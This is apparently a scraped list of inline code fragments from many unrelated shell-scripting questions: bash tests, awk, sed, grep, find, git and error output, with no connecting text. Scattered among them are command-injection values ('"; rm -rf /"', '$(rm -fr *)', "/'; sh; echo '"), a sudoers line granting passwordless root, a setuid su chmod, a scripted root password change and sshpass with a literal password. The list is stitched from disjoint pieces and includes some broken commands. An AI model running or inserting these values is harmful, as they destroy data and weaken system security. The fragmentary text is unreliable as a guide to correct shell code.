scanf("%lf", &data_set[i]);
port list installed
{ while read l ; do sleep 1; echo $l; done }
0xffff0000 command not found
[ ]
[ $notepad ] > 0
which sysbench
find folder/ -name "*.cpp" | xargs g++
find folder/ -name "*.cpp" -print0 | xargs -0 g++
find command
cp -a schedule/* public_html/
unset GLOBIGNORE
[ -d ]
! -d
if; then
return 1
#!/bin/sh -e
exit 1
String[] outFile = translate.translate()
Ruby 2.0.0p247
echo $PATH
minientrega.sh prac1
source ./conf/$1
bash 3.2.51(1)-release
cat | while read
while read line; do .... done < $FILE
-o allexport
+o allexport
SAVE=$(set +o | grep allexport) && set -o allexport && . .env; eval "$SAVE"
set -o allexport
set +o
set -o
(export $(cat .env | xargs) && rails c)
set -a
cat .env
minientrega.sh prac1
PREFIX_ONE="a word"
bash: export: `123qwe=bar': not a valid identifier
bash: export: `org.spring.config=something': not a valid identifier
eval $(cat .env | sed -e /^$/d -e /^#/d -e 's/^/export /')
function source_envfile() { export $(cat $1 | sed -e /^$/d -e /^#/d | xargs); }
source ~/.bash_profile
source_envfile .env
declare -x
declare -x VAR="val"
set -a
set +a
set -a
xargs < .env
key=val foo=bar
export key=val foo=bar
Hello there!
envfile ...
set -a; . conf-file; set +a; yourcommand
200 ok
service httpd restart
/bin/sh /home/username/apache.sh
man rename
cd Visual Studio 2012
#timeout N
MINIENTREGA_FICHEROS="informe.txt programa.c"
if [ -e $var ]
|| exit
grep -v
eval $(complete -p vi | sed 's/vi/open/')
-C $TEMP_DIR
-f $PROJECT_DIR/greg/Makefile
|| exit $?
-o $DERIVED_FILES_DIR/${INPUT_FILE_BASE}.m
tr -d $'\r' < old > new
cut -f 'seq 4, 4, 40' example.txt
gnu awk
[[ expression ]]
./test.sh -c "red blue yellow"
DR Group Name
shopt -s extglob
echo $testVar | tr "\n" " "
echo -n "|$COMMAND|"
$ man echo
|awk '{print $2}'
sed 's/["\n\r]//g'
tr -d '"\r\n'
sed -z
-test 23.txt
recursive grep
Last login: Sun Oct 13 13:17:20 on ttys000
-bash: i[ -s /Users/<Username>/.rvm/scripts/rvm ]]: No such file or directory
Charless-MacBook-Pro-2:~ <Username>
capify .
echo $PATH
echo $PATH
sass --watch src:public
iptables: No chain/target/match by that name.
[line 53]: iptables: No chain/target/match by that name.
< $1
randx 11
randx 11 7
rails new APP_PATH [options]
rails new
if [ $nosuchvar = 3 ]
if [ "$nosuchvar" = 3 ]
if [[ $foo == "a*" ]]
if [ $foo == "a*" ]
[[ … ]]
./arg.sh $ARGS
eval "./arg.sh $ARGS"
ls -r
sed 'N;s/\n/\t/g'
"from my folder."
"This is the"
var="This is the file.txt from my folder"
echo $var |sed -e 's/^.*\(file\.txt\).*$/\1/'
echo $var |sed -e 's/^.* \([^ ]\+\.[^ ]\+\) .*$/\1/'
gnuplot filter.gp
gnuplot -e "path='file.log';" filtermod.gp
source ~/.bashrc
bash test
sh test
set -x
export SHELLOPTS
Gitlab CI
tar xzf
drush make
drush dl
{a[$1]+=$2; ++b[$1]}
END {for (i in a) print i, a[i]/b[i]}'
sed 's/-.*//'
date -u > /tmp/test.time
cat file | grep 'regexp here'
grep -E '\Ahel'
-m 1
grep -P
grep 'regexp here' file
processed: \1\1
echo "aa$1aa"
sh my_script
xterm -e "tuxsay&"
xterm -e
cowsay -f tux $(fortune); bash
animals='all'; echo love $animals
./myprog4.sh BASE=Birthday EXT=jpg
R CMD BATCH script.R
ls -l
./script.sh input.txt output.txt
chmod 777 script.sh
pcregrep -M
f -
man tar
apt install pv
svn st
svn revert
svn st
grep SomeFolderA
awk {'print $2'}
xargs svn revert
svn revert
/Volumes/NO NAME
/Volumes/NO NAME/hello.txt
revert SomeFolderA
paste file[AB] | sed 's/\(.*\)\t\(.*\)/s\/\1\/\2\/g;/'
GNU awk
$ foo -h
$ foo -help
$ foo -bar
bash script
C app
C app
argv[argc - 1]
if (strcmp(posParam, "X") == 0){
do_some ve_name branch_name
"bad substitution"
testFunct param2
set -o nounset
bash -u
Windows Vista
Windows 7
Windows XP Pro
Windows Management Instrumentation command
TypeError: 'list' object is not callable
grep -r
ps aux
sudo kill $(cat /opt/nginx/logs/nginx.pid)
sh -c sudo kill $(cat /opt/nginx/logs/nginx.pid)
gitlab-runner ALL = (ALL) NOPASSWD: ALL
tail -f
cat realfile.log > $logfile
grep $pattern
grep $pattern
man grep
$ls /home/user/Downloads/tor-browser_en-US/start-tor-browser.sh
man time
which time
command time ...
exp_internal 1
java -version
mvn --version
command not found
sh foo.sh
if __name__ == '__main__':
echo $DEPENDENCIES
/usr/bin/Podcasts are synced.
dirs +1
$(dirs -l +1)
grep -P
Filesystem Size  Used Avail Use% Mounted on
/dev/sda1              15G   11G  3.3G  76% /
tmpfs                 7.9G     0  7.9G   0% /dev/shm
/dev/sda3              51G   45G  3.8G  93% /home
/dev/sdc1             917G  359G  512G  42% /data
grep --color -E "text match pattern|" mylargefile
/dev/sdc1             917G  359G  512G  42% /data
find . ...
run.sh offs0.5
/bin/bash <yourscript>
shell_exec('./path/to/script.sh param1 param2');
shell_exec('. /path/to/script.sh param1 param2');
cat log | grep 'status":"1' | grep '"email":"[^"]*"'
<(echo ...)
$0 ~ searchtext
0 100 200 300 400 500 600 700 800 900 1000
echo $v
git add .
git add
git add
"cat affy.txt | cut -d" " -f$columns"
"grep $word affy.txt | cut -d" " -f$columns"
"echo $is_there_g"
"echo $is_there_g" gives me a True value
man bash
man test
| cut -c 4-11
top -b
-U user
lynx $line
set -x
echo alias elog=..
alias elog
-1 hour
1 month ago
-n 1
-type f
if (index($i, y) != 0 ...
R CMD BATCH test.r
qsub testbash.sh
chmod 0755 test.r
R CMD BATCH
R -vanilla
declare -A ARRAY
eval $(declare -p base | sed "s,base,target,")
is something you need to replace, you will need to escape
GEO 2r
no such file or directory
tr -d
grep -Hc
while read file
while read
#!/usr/bin/env bash
[X, Y]
find ... -exec tail {} \;
find ".... -name \"$1\" ... "
print $k
printf "%s,",$k
-v k=$k
echo -e "10 ABC \n5 DEF \n87 GHI"
| xargs -I {} grep -w {} FILES |
-F"[: ]"
'($1==14 && $2>=40) || ($1==15 && $2==0)'
hour 14 + minute >=40
hour 15 + minute == 0
PS1="[\u@\h \W]\$ "
PS1="[\u@\h \W]\$ "
echo 'PS1="[\u@\h \W]\$ "'>>~/.bashrc
export EDITOR="emacs"
PS1="[\u@\h \W]\$ "
grep -c
echo $(seq 3)
1 2 3
echo $(seq -f '%02.f' 3)
01 02 03
echo $(seq 2 4)
2 3 4
echo $(seq 1 2 5)
1 3 5
echo A{b,c,d}
Ab Ac Ad
echo {/,$HOME/}Library
/Library /User/jdoe/Library
A1# A2# A3#
{$from..$to} # !! FAILS
echo A{1..5..2}
A1 A3 A5
echo A{001..003}
A001 A002 A003
echo {}
echo {1..$to}
grep -oP
ps -eo pid
while read line; do pwdx $line 2> /dev/null; done
2> /dev/null
cut -d':' -f1
while read line; do kill $line; done;
perl's rename
du -s
cp -r
man cp
tar c source | (cd target && tar x )
for number in ${lines[@]}; do ... done
whaat "loool * hahhaa"
whaat "loool * hahhaa"
man bash
echo "$@"
echo "${@}"
ctest -T Test
ctest -T Test
./script.sh 8
./script.sh 8 -g TAGLN
-f 7
-f 2-
grep -oP
sed -n
audacity &
echo '{ "a":{"b":{"c":{ "foo":1}}},"d":{"e":{"bar":2}}}' | jq '.[][][].foo'
[[ $phrase =~ $keyword ]]
[[ expression ]]
[[ ]]
[ ]
[ ]
[ ]
[[ ]]
( )
[ ]
[[ ]]
[[ ]]
[ ]
tar -tvf archive.tar
grep "^...x"
awk '{print $6}'
!! - expands into previous command
!$ - expands into last arg of previous command
cat / proc / $ pid / smaps
./myScript.sh testingFile
echo $SHELL
tt=grep 'test' "$1"
echo ${tt}
tt=grep 'test' testingFile
tt=grep -oE 'test' testingFile
./out.sh: line 3: -oE: command not found
command substitution
man bash
condition {action}
lufslist "$be_name"
grep -oP
lookbehind regex
sed -r
binmode( STDOUT, ':utf8' );
length( $mystring )
echo $f " " >> mydns.txt
-type f ! -name "$3"
sed 's/||/|\"\"|/g' temp2.csv
if [ -f /path/to/files/*identifier* ]
mv ${FILES[@]} /path/to/destination
$ unset LS_COLORS
man bash
-o *.suffix
-i ''
-i .bak
sed -i.bakup  's/linenumber/number/' ~/.vimrc
[ 1 ]
jobs|wc -l
bash show_files.sh *
Content-Length: 4806
readlink -fn
! -name '*git*'
find . ! -iwholename '*git*'
ls -A1 /mydir | wc -l
find /mydir -maxdepth 1 -type f | wc -l
line 2: syntax error near unexpected token
['/bin/bash', '/path/to/your/script.sh', arg1, arg2...]
PARTONE - PARTTWO
not a dash [-]
cut: bad delimiter
if [ -f -d etc...]
sodu -u someUser
id -Gn
groups myUser
setenv LD_LIBRARY_PATH .
echo $LD_LIBRARY_PATH .
setenv LD_LIBRARY_PATH .
make: setenv: Command not found
ls -l
stat -c
date +%s
date -r path/to/file +%s
[ $condition1 ] && [ $condition2 ]
user_id = $(mysql --user=$dba --password=$dbp $dbn -e "SELECT id FROM ${user_tbl} WHERE username = \"guest\"")
mysql --user=$dba --password=$dbp $dbn -e "UPDATE ${user_tbl} SET password=${pass} WHERE username = 'guest'"
sudo apt-get install coreutils
timeout DURATION PROGRAM n k INPUT
-c %s
screen -r
uniq -c
ssh remoteserver -L 4444:targetserver:5555
localclient --port 4444
sudo killall ssh
sleep 0
sleep 0.5
if [ "string" ]
-exec: missing argument
paste -d " | " Group.txt Name.txt Title.txt Rep_Number.txt > Output.txt
> Output.txt
brew -v install pypy
command not found
bash -x
man bash
. ./script.sh
saved_ifs=$IFS ; ... ; IFS=$saved_ifs
eval array=($(echo "'a b' 'c d'"))
array=('a b' 'c d')
myvar="'a b' 'c d'"
eval array=($(echo $myvar))
array=('a b' 'c d')
./program a b c INPUT > OUTPUT
./program a b INPUT > OUTPUT
./program $COMBO INPUT >> OUTPUT
g++ -g -Wall -o hello hello.cpp
\( .. \)
man date
BASH arrays
[[ $string =~ /John/[^/]*$ ]]
read -a
sh Calculator.sh 1 + 2 * s\(4\)
sh Calculator.sh 1 + 2 * s(4)
bash: syntax error near unexpected token
sh Calculator.sh 1 + 2 * s(4)
cd /home/user ; mkdir testfolder
trash $dir
[ ! -e $dir/*.part ] && trash $dir
[ ! -e $dir/*.part ]
trash $dir
trash $dir
The strung musical instrument often confused with a violin!
${dir// /}
man test
./script <parameter1> <parameter2>
help test
Usage: createpkg.sh <rev package>
| tail -n +2 | head -n -1
read first last
grep -n stackoverflow your_file
awk -F: 'NR==1 {printf "%d ", $1}; END{print $1}')
awk -v f=$first -v l=$last 'NR>=f && NR<=l' your_file
for i in {0..1000}; do ls -Falh /foo/ | grep bar.$i | tr -s " " | cut -d " " -f 5
"foo" => commandoutput"
awk '{print $5}'
ls -Falh
read i
man page
< curr.lst
set number
set list
set nolist
hg forget
hg forget
hg -v help filesets
find * -name "*.pro.user*"
pid${pidCtr}Aff="$tempAff0 $tempAff1"
_function_call VAR_A
" "
" "
: integer expression expected
set -xv
if [ "$age" -le "7" -o "$age" -ge "65" ]
elif [ "$age" -gt "7" -a "$age" -lt "65" ]
egrep "$v" /$INSTALL_DIR/$PROP_BUNDLE.log
for (x in a)
sort -n
git filter-branch
/bin/sh -c "$filter_commit" ...
tmp=$(xc < ~/to_keep.txt)
a file
git reset
gem install sass
sudo install
gem install sass
chmod u+x yourscript
make push
ctrl + k
ctrl + y
ctrl + k
ctrl + y
alt + b
ESC + b
alt + f
ESC + f
Ctrl-x + Ctrl-e
use imhdb
for file in *.csv
-f "$file"
-f "$file"
A=$(dig CNAME +noadditional +noquestion +nocomments +nocmd +nostats +norec google.com. @a.gtld-servers.net | grep -v SOA | sort -dbf)
B=$(dig A +noquestion +nocomments +nocmd +nostats +norec google.com. @a.gtld-servers.net | grep A | awk '{print $5}')
uname --kernel-name
uname --kernel-version
#define var val
-Dkernel_name="\"$(uname --kernel-name)\""
"#1 SMP Debian 3.2.46-1+deb7u1"
$1 < $2
kill -3
kill -2
kill -9
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/Library/Xcode/Specifications/Native Build System.xcspec
. ./a.sh
. ./script.sh
. ./script.sh
. path/to/script
. ./a.sh
source ./a.sh
(1) (2)|(1)
So for example, suppose you want to write a function that want to return something to another function. How should you do it ?
exec bash
"probability = some variable"
mkdir -p ${ApplicationName}${CURRENT_VERSION}ubuntu1-i386/usr/share/${ApplicationName}/jre1.6.0_35
mkdir -p ${ApplicationName}${CURRENT_VERSION}ubuntu1-amd64/usr/share/${ApplicationName}/jre1.6.0_35
[ ]
tr -d '[]'
's/ /\n/'
' '
g++ main.cpp
Lee Avital
David Oneill
grep -oP
for B in "$@";
git pushcur
grep -oP
alias gvim='gvim -f &'
conda update --all
echo $PATH
./safe.sh filename
safe.sh filename
bad interpreter: Text file busy
grep string1 file1.txt | grep -q string2 && echo found || echo not found
sh -c
sh -c  ./script
sleep 1h
-name "FILE-TO-FIND"
-exec rm -f {} \;
-type f
45 56
cp -v
. /pathto/myconfig
sqlite3 db_name.sqlite "command"
mysql -h myhost -u myusername -p
env variable USER on Windows or NetWare
wget LINK1 >/dev/null 2>&1 &
-P max_procs
man xargs
sed -i
After  FTP connection
Before ftp connection
After  ftp connection
Mon Oct 21 04:02:03 CEST 2013
-vtoday=$(date "+%Y%m%d")
/^Opening/ {file=$4}
/^After  ftp connection/
r="date -d \"" $0 "\" \"+%Y%m%d\""; r | getline dat;
if (today==dat) {print file, "PASS}
else {print file, "FAIL"}
"20131022-blah.gz saved"
/myFolder/Documents/20131022-blah.gz: Scheme missing (I believe this error prevents it from saving the file in /myFolder/Documents/).
" http://localhost:8080/archive.zip"
if [ = "run" ]
* )
"It's $(date +%A)"
split_file0.txt, split_file1.txt, etc
cluster ls -l
dsh -acM -- 'ls -l'
sed 's/./_/ -i
{ '0.10', '0.20', ...}
* * * * *
0 * * * *
minute, hour, day of month, month, day of week
sudo apt-get install eyeD3
eyeD3 --remove-all *.mp3
find .
find /path/to/folder1 /path/to/folder2 -type f -printf "%f %s\n" | sort | uniq -d
fdupes -r -S .
chmod +x scriptname
kill -0
kill -INT
kill -INT
kill -INT
[ ]
man bash
cd tes<tab><tab>
sudo perl -e 'chmod 0755, "/bin/chmod"'
~/chmod 400 ~/chmod
perl -e 'chmod 0755, "~/chmod"'
cmd | getline
\ grep 2
NAME by *NAME*
man date
list=$(echo "${UNIQUE[@]}")
BEGIN{split(d, a, " ")}
{for (i in a) printf "%s ", $(a[i]); printf "\n"}'
Run Run
grep -w
find $dir
/; sh
/'; sh; echo '
> /home/log_$ip 2>/dev/null &
cat <(echo "$FILECONTENT")
while read i; do echo $i; done </etc/passwd
echo $FILECONTENT | while read i; do echo $i; done
while read i; do echo $i; done <(echo "$FILECONTENT")
{ ... }
"$1" "$2" …
echo 'PROMPT_COMMAND=echo' >> ~/.profile
for name in files/*
for name in ./files/*
for name in 'files/*'
grep -oE '\S+/jboss-as/
= 0
of [0-9]
ooh, new == faster
Run script only when installing
-rwsr -sr-x
chmod 06755 /system/bin/su
sort -u
$3,$4 = $3,$2
file1 $3,$4 = file2 $3,$2
email=$(echo "SELECT email FROM adr" | sqlplus $user/$pass@$db)
echo $email
SQL*Plus: Release 8.1.7.0.0 - Production on Fri Oct 25 10:45:06 2013 (c) Copyright 2000 Oracle Corporation. All rights reserved. Connected to: Oracle8i Enterprise Edition Release 8.1.7.4.0 - Production JServer Release 8.1.7.4.0 - Production SQL> 2 Disconnected from Oracle8i Enterprise Edition Release 8.1.7.4.0 - Production JServer Release 8.1.7.4.0 - Production
rm -- --blah
rm ./--blah
grep -oP
sed -r
"one or more b's"
sed -i
gnu awk
basename $photo
route | grep '*' | awk '{print $8}'
dn:consumer1, 2nd hit dn:consumer2
count= $(...)
./check-num.sh 1 2 x 4 a
$1, $2, $3
else [bunch of code because we are root] fi
if [ $(id -u) -ne 0 ]; then echo "ur not root bro"; exit 1; fi
sudo bash shell_script.sh
sudo sh shell_script.sh
sudo apt-get install xml2
xml2 < content.xml
{print $0}
cat mycsv.csv | cut -d ',' -f3
while IFS=,
read -a csv_line;
do echo "${csv_line[0]}";done < file
< file
pip install csvkit
sudo apt install csvkit
csvcut -c 2 file.csv
sudo apt-get install csvtool
csvtool namedcol ID csv_file.csv
csvtool col 4 csv_file.csv
csvtool col 4 csv_file.csv | sed '1d'
cut -d, -f1 | sed 1d
func -name "$name" -text "$text"
gsed -r
egrep -o
this="'hi there' *"
print numbers[n]
ls -l $(cat filelist.txt)
[ ]
[ ]
[ -s file ]
[ $SHELL ]
lookahead regex
|| another command
&& another command
(A || B) && (C || D)
A || B && C || D
A || { B && { C || D; } }
A || B && C || D &
[ command here ] ||
var url = "page.php";
var url = "page2.php";
var R1 = "page2.php";
awk '$4== "7698"'
awk -F '\|'
export path
rvm get stable
type rvm | head -n 1
export PATH=/usr/local/bin:/Users/mcb/.rvm/gems/ruby-1.9.3-p448/bin:/Users/mcb/.rvm/gems/ruby-1.9.3-p448@global/bin:/Users/mcb/.rvm/rubies/ruby-1.9.3-p448/bin:...
rvm get sable
rvm get stable
man cd
last changed
last modified
python-script a b c
chmod +x /path/to/sorter.sh
subl init.js
Type = "Hourly Employee"
Type ="Commission Employee"
PING="ping -q -c1"
PING="/usr/bin/ping -q -c1"
USERS=$(awk '/\/X/ {print $1}' <(w))
awestruct -g
screen -list
Error: Unknown option r "myscreen" /bin/bash
man screen
realpath -m
~$ realpath -m http://www.example.com/1/2/../../index.php
~$ /home/username/http:/www.example.com/index.php
man 1 realpath
info coreutils 'realpath invocation'
awk '/.\/ex/{print;}'
to_roman ()
to_roman ()
150 - 100
to_roman 75 90 LXXXX
90 - 75
to_roman 75 50 L
set -xv
set +xv
source ~/.bashrc
. ~/.bashrc
command not found
for word in $line
echo $Var
set -- "${1:-/dev/stdin}"
$(printf %q "$FILENAME")
find /directory/to/search -type f -name $(printf %q "$FILENAME")
while read -r -d $'\0
find | while read
-type f
-o -printf
formatted_date=$(date -d$date_transfer +%Y%m%d%H%M)
touch -t $formatted_date /Users/J/Desktop/$(basename $f .AVI).mp4
touch -r refFile fileToBeChanged
my ~/.bashrc
source /path/to/file
. ./path/to/file
#!/usr/bin/env bash
return 1
set -e
help set
help set
set -e
set -e
set -e
set -o errexit
set -e
set -e
set -o pipefail
set -e
set -e
set -e
c1 || c2
arr=( $(find $1 -type f -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate) )
value too great for base
ps aux
echo $c
echo $A $B
tr -d '\n'
echo -n "$A" "$B"
echo ""
echo "$A" "$B"
help test
[ -n $VARIABLE ]
[ -n $VARIABLE ]
[ $VARIABLE ]
[[ ... ]]
[ ... ]
[[ ... ]]
[[ $foo == bar* ]]
[[ ... ]]
[ ... ]
-w -c
grep -q
man grep
-q, --quiet, --silent
{print $0}
awk 'NF=NF-1' file > new_file
Instead of writing the string "$#%#" i want everything except string "$#%#" written to file.
trap SIGCHLD
jobs -l
man sed
-maxdepth 1
-type f
ls -R
~/marker.sh go $@
ls -l
for i in $(command)
$(__git_ps1 '(%s)')
(name_branch #)
awk '/test/ {f=1} /link/ {g=1} /WOW/ {h=1} !f && !g && h; /testend/ {f=0} /linkend/ {g=0} /wow/ {h=0}' example | grep -o "WOW" | grep -c "WOW"
awk '/test/ {f=1} /link/ {g=1} /WOW/ {h=1} !f && !g && h; /testend/ {f=0} /linkend/ {g=0} /wow/ {h=0}' example | grep -o "WOW" | grep -c "WOW" example
awk '/test/ {f=1} /link/ {g=1} /WOW/ {h=1} !f && !g && h; /testend/ {f=0} /linkend/ {g=0} /wow/ {h=0}' example | grep -o "WOW" example
man grep
--invert-match option
grep -o "WOW"
me@mybox:~$ pfunc rand | head -17
After calling the shuffle() function, what is the value of array[8]?
sort -r
script.sh input
explorer .
echo -n
cat $var | awk 'regex'
echo $var | awk 'regex'
awk 'regex' <<< $var
awk 'regex' file
value = 2*1.5
"invalid arithmetic operator"
pytinstaller 2.0
ps aux
__existing_value="$(eval echo "\${$__array_name}" | sed -e 's,^[[:space:]]*,,' -e 's,[[:space:]]*$,,')"
su -c <command> $SUID_USER
sum=$(( sum + a ))
shift 2
[[ ... ]]
set -o
[[ ... ]]
set -o
$(( ... ))
export DISPLAY=:0
export XAUTHORITY=/home/username/.Xauthority
" "
complete -C 'custom command for completion' command
compadd -U
shopt -s lastpipe
<coff @gniourf_gniourf coff/>
echo $curr
this BAD_filename
perl's rename
-printf '%h'
mkdir $'\n'; touch $'\n/lalala'
printf '%q'
printf '%q'
cat "$var" | grep -Po '(?<=\d[a-zA-Z]).*\..*(?=[a-zA-Z]\d)'
echo "$var" | grep -Po '(?<=\d[a-zA-Z]).*\..*(?=[a-zA-Z]\d)'
grep -Po '(?<=\d[a-zA-Z]).*\..*(?=[a-zA-Z]\d)' <<< "$var"
echo '$foo'
echo "$foo"
$date (+ '%Y%d%m')
/directory/*.actualdate' is not a directory
mv: cannot stat '$'; No such file or directory
xargs ls -l
man stat
sort -u
exit $?
$ sudo apt-get install sshpass
$ sshpass -p 't@uyM59bQ' ssh username@server.example.com
$ sshpass -p 't@uyM59bQ' ssh -o StrictHostKeyChecking=no username@server.example.com
$ rsync --rsh="sshpass -p myPassword ssh -l username" server.example.com:/var/www/html/ /backup/
'./FOO/BAR BAZ '
help read
Address already in use
kill -0 $PID
echo $var1 | egrep -o "[0-9]+"
system("(echo 'newpassword'; sleep 1; echo 'newpassword') | passwd root");
echo $#
~/.ssh/known_hosts file
-v id=12345
{id=$1; print}
non-zero exit code
exit_code=ruby test
man basename
man rm
man cp
man expand
man rm
for i in $(cat file)
cp --parents *searchstring*/*(.) /newpath
cp --parents dir1/file1 dir2
t=/newpath;for d in *searchstring*/;do mkdir -p "$t/$d";cp "$d"* "$t/$d";done
find *searchstring*/ -type f -maxdepth 1 -exec rsync -R {} /newpath \;
find . -ipath '*searchstring*/*' -type f -maxdepth 2 -exec ditto {} /newpath/{} \;
ditto file dir/file
4 5 6
natc[0]=4, natc[1]=5
MM DD
%b %d
sort -M
awk '$1'
awk '$1'
awk '{print $1}'
cut -f 1
I need to keep the entire line, but I need to filter for duplicates based only on the first field
read -a nbh
while "this condition is not matched"
find $dirname -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-
echo 'text' | cat - file.txt > temp && mv temp file.txt
grunt watch
[ -z ]
[ "$THEME" ]
wmctrl -m | grep Name | cut -d: -f2
cp ~/.bash_profile.pysave ~/.bash_profile
 AAPL: 524.896
od -c
tr -d '\r'
find | xargs
while true
find . -type f  |xargs grep string |awk -F":" '{print $1}' |uniq
make me a sandwich
man grep
make me a sandwich
kill -9
pidof memcached
pkill memcached
pgrep memcached | xargs kill -9
killall memcached
pkill /usr/bin/memcached
pkill -9 /usr/bin/memcached
man zip
df -k /example
df -k
[ expr
expr2 ]
head -1
watch jobs
. watch jobs
source watch jobs
file /usr/bin/watch
source command
pgrep -fl mytoolsvc.sh
grep -oP
echo "no value"; return 1
... || ...
test $variable || (echo "Value of \$variable cannot be null."; exit 1)
%s//\//|/ //|/g
tail -f
set -e
set -E
< <(printf '%s' "$line")
<<< "$line"
cd /var/virtual/app1.com/
cd /var/virtual/app2.com/
cd /var/virtual/app3.com/
-d ''
-printf '%f\0'
exec /Users/memmaker650/Desktop/Scripts/script_renombrar_series/name
ls /Users/memmaker650/Desktop/Scripts/script_renombrar_series/name
while true;
git submodule foreach npm install
git help submodule
help :
kill <PID number>
kill -9
-printf "%h\n"
-maxdepth 1
find $kernel_path -size 0 ! -type d | sed -e "s!$kernel_path/!!")
openssl rand -hex 256 | xargs openssl prime -hex
while [{openssl rand -hex 256 | xargs openssl prime -hex} = *"$not"*]
awk '/is prime/ {print "ibase=16;"$1}' | bc
awk '/is prime/ {print $1}'
MATCH=".ABC=[0-9]\{3\} .GHI=[0-9]\{3,5\}"
[ ]
[ ]
[ ]
[[ ]]
[ ]
if [[ $partition == "/dev/sda2" ]]; then
bash scriptname.sh
apk add --no-cache bash
-type f
sed: RE error: illegal byte sequence
-o -name '*.js'
sed 's/^[[:space:]]*//'
$(rm -fr *)
.* mail from
mail from
cmake CMakeLists.txt && make && ./runTests
rename something something *
"/System/Library/CoreServices/Install\ Command\ Line\ Developer\ Tools.app"
"--pkg-info=com.apple.pkg.DeveloperToolsCLI", still "No receipt for 'com.apple.pkg.DeveloperToolsCLI' found at '/'.".
xcode-select --install
sudo rm -rf /Library/Developer/CommandLineTools
xcode-select --install
sed 's/\(ni = \).*/\1REPLACEMENT/'
( )
echo "some text"
/bin/sh ./foo.sh
set -x
set -x
bash pycharm.sh
bash /usr/opt/Pycharm/bin/Pycharm.sh
$ ./pycharm.sh
Tools -> Create Desktop Entry
"lock to Launcher"
$ pycharm-community
Lock on the Taskbar
for i in $process
${(s. .)}
As an aside, you could then open the file for read using
path to resource <specifiedResource>
path to resource
set myVariableName to path to resource "myBashScript.sh"
How can I remove the trailing /'s on just the first argument
#!/usr/bin/env python
vagrant ssh
ls -a
declare -i var
declare -r var
declare -f
declare -F
declare -f functionname
declare -f testfunct
-type f
mv {} ..
"print "
man grep
-exec ... +
grep --include
/home/usr/first/tmp1 100
/home/usr/first/tmp 80
echo "one Word" | grep -P "(?i)\bword\b"
sed -i 's/original_match_expr/replacement_expr/g' myfile.sql
:a; $! { N; ba }
-depth 2
-maxdepth 2
[ "$var" != "value" ]; echo $?
[[ $var != value ]]; echo $?
i=0; (( i++ )); echo $?
echo $?
if 0 ; then ...
select ... in ...
cd build && make
CREATE clustered INDEX idx_foobar ON foobar (f1, f2, f3, f4,f5);
create clustered index on table (...);
create index on table (...); cluster table;
using index
cluster table
what can I do to make them available after the script execution is over?
echo -e
man echo
-e     enable interpretation of backslash escapes
dots diff [filename]
dots files
dots diff [tab][tab]
dots diff bash/[tab][tab]
compopt -o filenames
$(dots files)
compopt -o filename
{n, m}
grep -E
gitfix "some commit comment"
id -g
id -g
* * * * * touch /home/myUser/scripts/test.txt
man date
date +"%H%M"
date '+%H%M'
for file in
$(awk ...)
while read ...
for x in ...; do
for in
echo "Number of Threads..."
"Number of Threads: $numThreads"
./proc sth1 & ./proc sth2 & ./proc sth3 & ... & ./proc sthN &
time (./proc sth1 &  ... & ./proc sthN &)
./proc sthX
wait [jobspec or pid ...]
man bash
bind -x
bind -x
bind -X
gnu awk
strip -d
nm -n
grep -A1 ' i$
cut -d' ' -f1
read addr next_addr
scp -P 1337 user@remote:foo.txt .
<<< "$keys"
. script.sh
rm ~/.bash_profile
rvm implode
awk -F '\t' '{…}' a.txt
awk 'BEGIN {FS="\t"} {…} a.txt
awk -v 'FS=\t' '{…}' a.txt
awk '{…}' FS='\t' a.txt
awk '{…}' a.txt FS='\t'
grep -Po
do_mail attachment.csv user@domain.com
/^ *$/d
sed '1,/^$/d' file
sed -n '/./,$p'
sed -n $'/[^ \t]/,$p'
cd 1
cd one
curl google.com
virtualenv $VIRTUAL_ENV
grep -o
grep -o
wc -l
bash /home/*******/public_html/add_user $login  '$pwd'
"; rm -rf /"
command not found
if [$type="Salaried"]
[some, thing]
'line 1\nline 2'
"Not a root user"
id -u
source ~/.bashrc
source script.sh
. ./script.sh
source ./script.sh
ENV_VAR=$( /path/to/your_script arg1 arg2 arg3 arg_whatever )
for F in */*/2011/*/* ; do gzip "$F" ; done
./a.sh &
man join
"s/(::\s+ni\s+=)[^=]*$/\1 512/"
PS1='\e[3;32m[\u@\h:\W]$ \e[m'
while read x; do ...; done < file1
"$(grep -Fi "$x" file2)"
dump$(date +%y%m%d-%H%M%S).pcap
Id   int
Id   string
s/^Id int$
Id int
I like Id int
newName="A different name"
/foo/bar/some TEMPLATE directory/with files
/foo/bar/some A different name directory/with files
some TEMPLATE file
some A different name file
export newName
bash -c
bash -c
shopt -s extglob
rm !(filename1|filename2) -rf
-type f -exec rm "{}" \;
ls | grep -v "nodel.\+" | xargs rm -rf
[ test ]
[ test ]
$( ls)
[ -z $STRING ]
[ -z SEVERAL WORDS ]
[ -z ]
[...] && [...]
[... -a ...]
[...] || [...]
[... -o ...]
sort -n
wc -l
declare -A map=()
; rm -rf *
[[ ]]
man 8 init
man find
| xargs
return 1
return 1
return 1
return 1
This shows that init adopts this orphan.
set -e
:set ff?
man tcgetattr
wc -c
wc -m
i want to search field 5 of the text file, whether it is "Salaried", "Commission" or "Hourly"
tmutil delete /path/to/snapshot
seq 1 3
$HOME/Maildir/.1\ Archive/
grep -rl "<script" .
"C:\Program Files (x86)\Notepad++\notepad++.exe" ./filename.txt
date +"%A %d %B %Y"
find ./ -name '*.html' | while read i; do echo $i; sed -i 's#</head>#<link rel="canonical" href="'$i'" />\n</head>#I' ./$i;done
find ./ -name '*.html' | while read i; do echo $i; sudo sed -i 's#<link rel="canonical" href=".#<link rel="canonical" href="http://domainname.here#g' ./$i;done;
for file in *.pdf; do echo $file; evince $file; sleep 20s; killall evince; done
git log -1 --pretty=format:%b <hash>
git log
git log
-n num
--pretty=format:string with directives
git log -n 1 --pretty=format:%s $hash
git log -1 --pretty=format:%s
git log --pretty=oneline {your_hash} | grep {your_hash}
certain requirements met
shell -$SHELL
screen -dm
screen -dmL env
man bash
screen ./test.sh
screen ./example.sh
screen -d -m ./example.sh
man bash
bash -i -I
source ~/.bashrc
git ls-files | grep "\.java$" | xargs cat | wc -l
git ls-files
wc -l
wc -l
wc -l
-F ' +|\\.'
wc -l
/\./ { sumlines[$NF] += $2 }
wc -l
git ls-files
awk -vn=$n '{print}/regex/&&!--n{exit}'
awk -vn=$n '/regex/&&!--n{exit}{print}'
awk -vn=$n 'n<=0;/regex/{--n}'
-v n=$n
awk -v n=$n 'p<n; /regex/{p++}' file
awk -v n=$n '/regex/{p++} p<n' file
